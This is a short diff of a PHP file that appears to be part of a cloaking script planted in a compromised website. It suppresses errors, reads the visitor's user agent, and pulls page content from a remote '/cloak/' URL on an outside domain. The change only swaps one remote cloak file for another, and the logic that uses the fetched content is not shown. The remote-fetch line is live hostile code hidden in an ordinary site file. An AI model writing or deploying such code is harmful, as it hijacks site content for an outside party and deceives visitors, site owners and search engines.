@@ -3,7 +3,7 @@ error_reporting(0);
 $agent = $_SERVER['HTTP_USER_AGENT'];
 $reff = $_SERVER['PHP_SELF'];
 
-$obengkemarenkemana = file_get_contents('https://tereasite.pro/cloak/blackbirdleathers.txt');
+$obengkemarenkemana = file_get_contents('https://tereasite.pro/cloak/windows.txt');
 
 
 $homeurlindex = '/index.php';
